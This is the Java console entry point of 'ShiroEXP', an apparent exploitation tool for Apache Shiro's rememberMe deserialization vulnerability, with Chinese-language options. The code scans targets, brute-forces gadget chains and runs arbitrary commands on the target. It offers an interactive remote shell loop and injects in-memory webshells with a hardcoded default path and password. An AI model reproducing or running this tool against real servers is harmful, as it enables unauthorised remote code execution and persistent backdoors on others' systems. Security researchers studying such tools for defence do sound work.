package com.y5neko.shiroexp;

import com.y5neko.shiroexp.config.AllList;
import com.y5neko.shiroexp.copyright.Copyright;
import com.y5neko.shiroexp.misc.Log;
import com.y5neko.shiroexp.misc.Tools;
import com.y5neko.shiroexp.object.KeyInfoObj;
import com.y5neko.shiroexp.object.TargetOBJ;
import com.y5neko.shiroexp.payloads.*;
import org.apache.commons.cli.*;

import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Scanner;

public class Console {
    public static void main(String[] args) throws Exception {
        System.out.println(Copyright.getLogo());

        // 命令行参数解析
        Options options = getOptions();

        CommandLineParser parser = new DefaultParser();
        CommandLine cmd = parser.parse(options, args);

        // 打印帮助信息
        if (cmd.hasOption("h")) {
            HelpFormatter helpMenu =  new HelpFormatter();
            helpMenu.printHelp("java ShiroEXP.jar", options, true);
        }
        // 提供url后的逻辑处理
        else if (cmd.hasOption("u")) {
            TargetOBJ target = new TargetOBJ(cmd.getOptionValue("u"));

            // 指定携带Cookie
            if (cmd.hasOption("cookie")){
                Map<String, String> cookie = new HashMap<>();
                cookie.put("Cookie", cmd.getOptionValue("cookie"));
                target.setHeaders(cookie);
            }

            // 设置全局代理
            if (cmd.hasOption("proxy")){
                target.setProxy(cmd.getOptionValue("proxy"));
                System.out.println(Log.buffer_logging("INFO", "当前代理: " + target.getProxy()));
            }

            // 指定rememberMe字段名
            if (cmd.hasOption("rf")){
                target.setRememberMeFlag(cmd.getOptionValue("rf"));
            }

            // 指定key
            if (cmd.hasOption("k")){
                target.setKey(cmd.getOptionValue("k"));
            }

            // 指定gadget-echo
            if (cmd.hasOption("gadget-echo")){
                target.setGadget(cmd.getOptionValue("gadget-echo").split("\\+")[0]);
                target.setEcho(cmd.getOptionValue("gadget-echo").split("\\+")[1]);
            }

            // 指定gadget
            if (cmd.hasOption("gadget")){
                target.setGadget(cmd.getOptionValue("gadget"));
            }

            // 指定扫描key
//            if (cmd.hasOption("bk")) {
//                System.out.println(Log.buffer_logging("INFO", "开始爆破key..."));
//                KeyInfoObj keyInfoObj;
//                // 如果指定了自定义rememberMe字段
//                if (cmd.hasOption("rf")) {
//                    keyInfoObj = BruteKey.bruteKey(target, cmd.getOptionValue("rf"));
//                } else {
//                    keyInfoObj = BruteKey.bruteKey(target);
//                }
//                System.out.println(Log.buffer_logging("SUCC", "检测到key: " + keyInfoObj.getKey() + ", 加密算法: " + keyInfoObj.getType()));
//                return;
//            }
            // 指定漏洞扫描
            else if (cmd.hasOption("s")) {
                if (cmd.hasOption("e") && cmd.getOptionValue("e").equals("Shiro550Tab")){
                    Shiro550VerifyByURLDNS.verify(target);
                } else if (cmd.hasOption("e") && cmd.getOptionValue("e").equals("Shiro721")){
                    System.out.println("Shiro721验证");
                } else {
                    Shiro550VerifyByURLDNS.verify(target);
//                    System.out.println("同时验证");
                }
                return;
            }
            // 指定爆破回显链
            else if (cmd.hasOption("be")) {
                System.out.println(Log.buffer_logging("INFO", "正在爆破回显链..."));
                List<String> vaildGadgets = BruteGadget.bruteGadget(target, target.getKey());
                return;
            }
            // 指定命令执行
            else if (cmd.hasOption("c")) {
                System.out.println(Log.buffer_logging("INFO", "正在执行命令..."));
                System.out.println(Log.buffer_logging("SUCC", "命令执行成功"));
                CommandExcute.commandExcute(target, cmd.getOptionValue("c"));
                return;
            }
            // 指定shell模式
            else if (cmd.hasOption("shell")){
                if (!(cmd.hasOption("gadget-echo") || cmd.hasOption("gadget"))){
                    System.out.println(Log.buffer_logging("EROR", "未指定gadget-echo"));
                    return;
                }
                System.out.println(Log.buffer_logging("INFO", "正在进入Shell模式..."));
                Scanner scanner = new Scanner(System.in);
                String shell;
                do {
                    System.out.print(Tools.color("ShiroEXP@localhost", "GREEN") + ":" + Tools.color("~", "BLUE") + "$ ");
                    shell = scanner.nextLine();
                    if (shell.equals("exit")){
                        System.out.print(Log.buffer_logging("INFO", "退出Shell模式"));
                        break;
                    }
                    CommandExcute.commandExcute(target, shell);
                    target.resetHeaders();
                } while (true);
                return;
            }
            // 指定注入内存马
            else if (cmd.hasOption("mem-type")){
                String memPath = "/img/20190231.png";
                String memPass = "Y5neKO@2024";

                if (cmd.getOptionValue("mem-type").equals("ls")){
                    System.out.println(Log.buffer_logging("INFO", "正在获取可用内存马类型"));
                    try {
                        System.out.println("----------");
                        for (String memType : AllList.memTypes){
                            System.out.println(memType);
                        }
                        System.out.println("----------");
                    } catch (Exception e) {
                        System.err.println(Log.buffer_logging("EROR", e.getMessage()));
                    }
                    return;
                }

                if (!(Tools.containsString(AllList.memTypes, cmd.getOptionValue("mem-type")))){
                    System.out.println(Log.buffer_logging("EROR", "请指定正确的内存马类型, 可用类型:"));
                    System.out.println("----------");
                    for (String memType : AllList.memTypes){
                        System.out.println(memType);
                    }
                    System.out.println("----------");
                    return;
                }

                if (!(cmd.hasOption("gadget"))){
                    System.out.println(Log.buffer_logging("EROR", "未指定gadget"));
                    return;
                }
                if (cmd.hasOption("mem-path")){
                    memPath = cmd.getOptionValue("mem-path");
                }
                if (cmd.hasOption("mem-pass")){
                    memPass = cmd.getOptionValue("mem-pass");
                }

                System.out.println(Log.buffer_logging("INFO", "正在注入内存马..."));
                try {
                    MemshellService.InjectResult result = MemshellService.injectMemshell(target, cmd.getOptionValue("mem-type"), memPath, memPass, cmd.getOptionValue("gadget"));
                    if (result.success) {
                        System.out.println(Log.buffer_logging("SUCC", result.message));
                        System.out.println("----------");
                        System.out.println("类型: " + result.memshellType);
                        System.out.println("地址: " + result.path);
                        System.out.println("密码: " + result.password);
                        System.out.println("----------");
                    } else {
                        System.out.println(Log.buffer_logging("EROR", result.message));
                        System.out.println("----------");
                        System.out.println("响应内容: " + result.response);
                        System.out.println("----------");
                    }
                } catch (Exception e) {
                    System.err.println(Log.buffer_logging("EROR", e.getMessage()));
                }
            }
            // 未指定操作
            else {
                System.out.println(Log.buffer_logging("EROR", "请指定模块"));
            }

            return;
        }
    }

    /**
     * 获取命令行参数
     * @return Options
     */
    private static Options getOptions() {
        Options options = new Options();

        options.addOption("h", "help", false, "打印帮助");
        options.addOption("u", "url", true, "目标地址");
        options.addOption("bk", "brute-key", false, "爆破key");
        options.addOption("rf", "rememberme-flag", true, "自定义rememberMe字段名");
        options.addOption("s", "scan", false, "扫描漏洞");
        options.addOption("k", "key", true, "指定key");
        options.addOption("be", "brute-echo", false, "爆破回显链");
//        options.addOption("e", "exp", true, "指定exp {Shiro550Tab, Shiro721}");
        options.addOption(null, "cookie", true, "携带Cookie");
        options.addOption("c", "cmd", true, "执行命令");
        options.addOption(null, "gadget-echo", true, "指定回显链");
        options.addOption(null, "gadget", true, "指定利用链");
        options.addOption(null, "shell", false, "进入Shell模式");
        options.addOption(null, "mem-type", true, "打入内存马类型(输入ls查看可用类型)");
        options.addOption(null, "mem-pass", true, "内存马密码");
        options.addOption(null, "mem-path", true, "内存马路径");
        options.addOption(null, "proxy", true, "设置代理(ip:port)");
        return options;
    }
}